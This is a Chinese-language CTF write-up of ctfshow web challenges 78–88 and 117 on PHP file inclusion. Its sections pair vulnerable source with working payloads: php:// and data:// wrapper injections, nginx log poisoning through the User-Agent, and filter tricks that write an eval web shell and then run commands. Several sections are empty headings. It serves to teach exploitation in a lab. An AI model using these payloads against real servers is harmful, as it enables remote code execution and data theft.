---
description: 这里主要是记录ctfshow的web入门的文件包含的wp。
---

# 🍌 CTFSHOW文件包含

## <mark style="color:purple;background-color:green;">（1）WEB 78</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:52:43
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:54:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>

这个题目其实和我们当时做RCE远程代码执行的时候有做到过，我们如果要通过include读取文件，就需要用到http://filter协议去读取源码

```url
http://4258ef9c-e6a8-45ef-a0b4-b43bc0a5a484.challenge.ctf.show/?file=php://filter/read=convert.base64-encode/resource=flag.php
```

<figure><img src="../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure>

得到的base64编码是

```
PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0xNiAxMDo1NToxMQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMTYgMTA6NTU6MjANCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxhZz0iY3Rmc2hvd3s0MTgyMmFiNi05MzBjLTQxMTUtYWFlNi02NjYyNDg2ZmE3MWN9Ijs=
```

解码得

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:55:11
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:55:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


$flag="ctfshow{41822ab6-930c-4115-aae6-6662486fa71c}";
```

***

## <mark style="color:purple;background-color:green;">（2）WEB79</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:10:14
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:12:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>

上述代码的意思大概就是，我们得到的$file变量，要先将php替换为？？？再进行执行，那么我们读取文件就不能用php://filter和php://input这两个了，我们可以使用data://去通过include去执行我们输入的php片段，这个php片段可以直接查看flag.php代码。

```url
http://928e3ddc-0ea1-404a-a9d9-fb53aface656.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```

得到最后的flag。

<figure><img src="../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;background-color:green;">（3）web80</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:26:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>

这次不止过滤了php，还过滤了data，所以得用日志包含，我们现在需要知道这个用的什么框架。我们可以用linux的whatweb指令

```sh
whatweb http://ed2a102a-36b7-4969-b43f-eac4d7abef51.challenge.ctf.show/ 
```

<figure><img src="../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>

可以从上面看到有nginx，nginx在linux下面的日志目录在/var/log/nginx/access.log中，并且会包含user-agent和路径。

我们需要向这个文件中写入我们的php代码，比如查看一下源代码或者写入一句话木马。这里我选择执行指令。

```http
GET /?file=/var/log/nginx/access.log HTTP/1.1
Host: ed2a102a-36b7-4969-b43f-eac4d7abef51.challenge.ctf.show
User-Agent: <?php system('ls');?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1



```

<figure><img src="../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>

可以看到我们的代码起作用了，后面显示了我们当前目录下的文件，有fl0g.php。我们接下来只要查看flag.php的源代码就可以了，直接cat flag.php,

这里介绍一个指令可以直接把文件的以base64编码的形式输出

```sh
base64 file
```

所以我们最后的头部的结果就是

```http
GET /?file=/var/log/nginx/access.log HTTP/1.1
Host: ed2a102a-36b7-4969-b43f-eac4d7abef51.challenge.ctf.show
User-Agent: <?php system('cat fl0g.php');?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1


```

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;background-color:green;">（4）WEB81</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 15:51:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

上一题的包含日志我们还能用，一样的，不知道为什么我的环境突然做不了了，但是结果就是上一题一样的wp。

***

## <mark style="color:purple;background-color:green;">（5）web82</mark>

这题是条件竞争，我们

## <mark style="color:purple;background-color:green;">（6）WEB 83</mark>

## <mark style="color:purple;background-color:green;">（7）WEB 84</mark>

## <mark style="color:purple;background-color:green;">（8）WEB 85</mark>

## <mark style="color:purple;background-color:green;">（9）WEB 86</mark>

## <mark style="color:purple;background-color:green;">（10）WEB87</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:57:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);

    
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

这道题帮我加深了我的绕过，我甚至之前都没彻底理解了getshell，现在我才理解到这个真正的含义。

可以看到有file\_put\_contents,我们就应该猜到是用php://filter协议，又因为后面有死亡绕过，我们再来一个base64解码。

所以我们往file里面传入的不是php代码了，而是一个协议，我们在当前目录下写入一个getshell。

首先在hackbar里面写入post和get两个参数，content需要base64加密绕过，并且因为php die是6个字符，所以需要往base64字符串前面添加两个字符。我们的content想实现的是\<?php @eval($\_POST\[x]);?>

因为这样我们可以写入一个shell，然后我们可以向x里面传递执行命令的参数。

```url
content=abPD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==
```

而file因为我们看到一个url解码函数，并且为了绕过一些关键词，所以我们需要两次url加密。而且是全加密（用burpsuite上面的可以实现全加密），resource可以是等于任意名字的php文件。

```url
http://1bd6bcd0-f840-4cc2-9665-0601cbe23a6d.challenge.ctf.show/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后我们就会看到一片空白，这说明我们的文件已经上传上去了，getshell。yes。

然后我们接下来直接访问该目录下的这个php文件，然后直接访问这个getshell，往getshell里面传参，去查看当前目录下的文件。

然后我们可以传参去查看f开头的文件。你也可以先传入system('ls');去查看当前目录下的文件。

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

最后得到flag。

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;background-color:green;">（11）web88</mark>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-17 02:27:25
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

 */
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

可以看到过滤了php的协议，但是没有过滤=，所以我们用data://伪协议直接传递php代码，然后执行

所以我们写入的为\<?php cat f\*.php?>，并且因为php被过滤了，所以我们需要用base64加密的那一句。

```url
http://597fa6fc-ea54-4078-b972-0c0e6295813d.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioucGhwIik7Pz4
```

我相信肯定有小伙伴和我之前写一样，最后有个等号，然后出来一个error，因为这个题过滤了等号，所以要把等号删掉（其实这个地方我不是很理解，我删掉了，base64还能解码成功吗）后面想到每三个转化为四个，也许能执行？，我不知道，这个有小伙伴知道吗。

就这样按照他的写吧

然后查看源码，发现flag。

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;background-color:green;">（12）WEB 117</mark>

116需要misc，先不写了。

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: yu22x
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 18:16:59

*/
highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents); 
```

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

需要死亡绕过，然后base64和rot13都被ban了。所以只能寻找其他的过滤方式。补充死亡绕过的过滤方式了，jrm谁懂啊。这里用了刚刚学的ucs-2，然后我们看到其实除了这个他也没啥其他的陷阱，其余按照之前的思路写，就是过滤器形式啥的变了一下。

GET:

```php
http://c8302562-9e80-45b9-8120-88c1b16d2137.challenge.ctf.show/?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
```

POST:

```url
contents=?<hp pvela$(P_SO[T]1;)>?
```

写入成功了，但是这个没有回显，没关系，我们直接去看目录下的这个文件，然后传入查看文件的指令

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

GET:

```url
http://c8302562-9e80-45b9-8120-88c1b16d2137.challenge.ctf.show/a.php
```

POST:

```url
1=system('tac f*');
```

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
